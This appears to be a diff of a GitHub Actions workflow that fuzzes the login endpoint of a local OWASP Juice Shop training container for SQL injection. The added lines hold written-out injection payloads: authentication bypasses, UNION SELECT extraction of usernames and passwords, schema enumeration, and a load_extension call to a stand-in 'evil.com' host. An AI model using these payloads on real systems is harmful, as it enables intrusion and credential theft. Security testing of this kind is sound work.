@@ -1,8 +1,9 @@
-name: Fuzzing
+name: Juice Shop SQL Injection Fuzzing
 
 on:
   push:
     branches: [ main ]
+  workflow_dispatch:  # Для ручного запуска
 
 permissions:
   contents: write
@@ -11,41 +12,221 @@ permissions:
   actions: read
 
 jobs:
-  ffuf:
+  ffuf-sql-injection:
     runs-on: ubuntu-latest
     services:
-        juice:
-          image: bkimminich/juice-shop
-          ports:
-            - 3000:3000
+      juice:
+        image: bkimminich/juice-shop
+        ports:
+          - 3000:3000
+        options: >-
+          --health-cmd="curl -f http://localhost:3000 || exit 1"
+          --health-interval=10s
+          --health-timeout=5s
+          --health-retries=5
+
     steps:
-      - name: Wait for service
-        run: |
-            sleep 10 
-            curl --path-as-is -i -s -k -X $'POST' \
-              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
-              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
-              $'http://localhost:3000/rest/user/login'
+      - name: Checkout repository
+        uses: actions/checkout@v4
 
-      - name: Get payloads
+      - name: Wait for Juice Shop to be ready
         run: |
-          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
-      
-      - name: Install fuzzing
+          echo "Waiting for Juice Shop to start..."
+          sleep 15
+          # Проверяем, что сервис отвечает
+          curl -s -o /dev/null -w "%{http_code}" http://localhost:3000
+          echo "Service is up!"
+          
+      - name: Install ffuf
         run: |
-          go install github.com/ffuf/ffuf/v2@latest
-
-      - name: Run fuzzing
+          # Устанавливаем ffuf
+          wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
+          tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
+          chmod +x ffuf
+          sudo mv ffuf /usr/local/bin/
+          
+      - name: Download SQL injection payloads
         run: |
-          $HOME/go/bin/ffuf || true
-
-      - name: Get Logs from Service
+          # Скачиваем различные payloads для SQL injection
+          mkdir -p payloads
+          
+          # Основные payloads для SQLite
+          wget -O payloads/sqlite-payloads.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/SQLite.txt
+          
+          # Общие SQL injection payloads
+          wget -O payloads/sql-general.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/detect.txt
+          
+          # Blind SQLi payloads
+          wget -O payloads/blind-sqli.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/blind.txt
+          
+          # Создаем комбинированный файл
+          cat payloads/*.txt > all-payloads.txt
+          # Удаляем дубликаты
+          sort -u all-payloads.txt > unique-payloads.txt
+          
+      - name: Prepare custom payloads for SQLite
         run: |
-          docker logs $(docker ps -q) > juice-logs.log
-
-      - name: Upload results
+          # Создаем специфичные payloads для SQLite
+          cat > payloads/custom-sqlite.txt << 'EOF'
+          ' OR '1'='1
+          ' OR 1=1--
+          ' OR 1=1;--
+          admin' OR '1'='1
+          admin' OR 1=1--
+          ' UNION SELECT null,null--
+          ' UNION SELECT 1,2--
+          ' UNION SELECT username,password FROM users--
+          ' OR 1=1 LIMIT 1--
+          '; SELECT SLEEP(5)--
+          ' OR 1=1 AND (SELECT 1 FROM sqlite_master)--
+          ' OR EXISTS(SELECT * FROM sqlite_master)--
+          ' OR 1=1 AND (SELECT sql FROM sqlite_master WHERE type='table')--
+          '||(SELECT load_extension('\\evil.com\evil.dll'))--
+          '; PRAGMA table_info(users);--
+          ' UNION SELECT name FROM sqlite_master WHERE type='table'--
+          ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--
+          ' AND (SELECT COUNT(*) FROM sqlite_master) > 0--
+          EOF
+          
+      - name: Test login endpoint (baseline)
+        run: |
+          echo "Testing baseline login..."
+          curl -X POST http://localhost:3000/rest/user/login \
+            -H "Content-Type: application/json" \
+            -d '{"email":"test@test.com","password":"test"}' \
+            -o baseline-response.txt
+          echo "Baseline response stored"
+          
+      - name: Run ffuf fuzzing for SQL injection
+        run: |
+          echo "Starting SQL injection fuzzing..."
+          
+          # Фаззинг параметра email
+          ffuf -u http://localhost:3000/rest/user/login \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"email":"FUZZ","password":"password"}' \
+            -w unique-payloads.txt \
+            -t 20 \
+            -p 0.5 \
+            -o ffuf-results.json \
+            -of json \
+            -fr "Invalid email or password" \
+            -mc 200,302,401,500 \
+            -v 2>&1 | tee ffuf-output.txt
+            
+          # Также фаззинг параметра password
+          ffuf -u http://localhost:3000/rest/user/login \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
+            -w unique-payloads.txt \
+            -t 20 \
+            -p 0.5 \
+            -o ffuf-results-password.json \
+            -of json \
+            -fr "Invalid email or password" \
+            -mc 200,302,401,500 \
+            -v 2>&1 | tee ffuf-output-password.txt
+            
+      - name: Analyze results
+        run: |
+          echo "=== Analyzing fuzzing results ==="
+          
+          # Проверяем успешные результаты
+          if [ -f "ffuf-results.json" ]; then
+            echo "Found results in ffuf-results.json"
+            # Ищем успешные ответы (не 401)
+            jq '.results[] | select(.status != 401)' ffuf-results.json > successful-hits.json || true
+            if [ -s "successful-hits.json" ]; then
+              echo "POTENTIAL SQL INJECTION FOUND!"
+              cat successful-hits.json
+            else
+              echo "No successful SQL injection hits found"
+            fi
+          fi
+          
+      - name: Manual SQL injection test
+        run: |
+          echo "=== Running manual SQL injection tests ==="
+          
+          # Тест 1: Классическая SQL инъекция
+          echo "Test 1: Basic SQL injection"
+          curl -X POST http://localhost:3000/rest/user/login \
+            -H "Content-Type: application/json" \
+            -d '{"email":"'\'' OR '\''1'\''=''\''1","password":"anything"}' \
+            -v 2>&1 | grep -E "(HTTP|Set-Cookie|Location|email)" || true
+            
+          # Тест 2: SQL инъекция с комментарием
+          echo -e "\nTest 2: SQL injection with comment"
+          curl -X POST http://localhost:3000/rest/user/login \
+            -H "Content-Type: application/json" \
+            -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' \
+            -v 2>&1 | grep -E "(HTTP|Set-Cookie|Location|email)" || true
+            
+          # Тест 3: Union-based injection
+          echo -e "\nTest 3: Union-based SQL injection"
+          curl -X POST http://localhost:3000/rest/user/login \
+            -H "Content-Type: application/json" \
+            -d '{"email":"'\'' UNION SELECT null,null--","password":"anything"}' \
+            -v 2>&1 | grep -E "(HTTP|Set-Cookie|Location|email)" || true
+          
+      - name: Get Juice Shop logs
+        run: |
+          echo "Getting Juice Shop logs..."
+          docker logs $(docker ps -qf "ancestor=bkimminich/juice-shop") > juice-logs.log 2>&1 || true
+          
+      - name: Upload fuzzing results as artifact
         uses: actions/upload-artifact@v4
         with:
-          name: security-reports-bundle
+          name: sql-injection-results
           path: |
+            ffuf-results.json
+            ffuf-results-password.json
+            ffuf-output.txt
+            ffuf-output-password.txt
+            successful-hits.json
             juice-logs.log
+            baseline-response.txt
+          retention-days: 7
+          
+      - name: Create summary report
+        if: always()
+        run: |
+          echo "Creating summary report..."
+          cat > summary-report.md << 'EOF'
+          # SQL Injection Fuzzing Report
+          
+          ## Test Details
+          - Application: OWASP Juice Shop
+          - Target: /rest/user/login
+          - Method: POST
+          - Test Date: $(date)
+          
+          ## Results Summary
+          
+          EOF
+          
+          if [ -f "successful-hits.json" ] && [ -s "successful-hits.json" ]; then
+            echo "## ⚠️ POTENTIAL SQL INJECTIONS FOUND!" >> summary-report.md
+            echo "" >> summary-report.md
+            echo "### Successful Payloads:" >> summary-report.md
+            echo '```json' >> summary-report.md
+            cat successful-hits.json >> summary-report.md
+            echo '```' >> summary-report.md
+          else
+            echo "## ✅ No SQL injections detected" >> summary-report.md
+            echo "No payloads bypassed authentication in this test." >> summary-report.md
+          fi
+          
+          echo "" >> summary-report.md
+          echo "## Test Configuration" >> summary-report.md
+          echo "- Total payloads tested: $(wc -l < unique-payloads.txt)" >> summary-report.md
+          echo "- Fuzzer: FFUF v2.1.0" >> summary-report.md
+          echo "- Target URL: http://localhost:3000/rest/user/login" >> summary-report.md
+          
+      - name: Upload summary report
+        uses: actions/upload-artifact@v4
+        with:
+          name: summary-report
+          path: summary-report.md
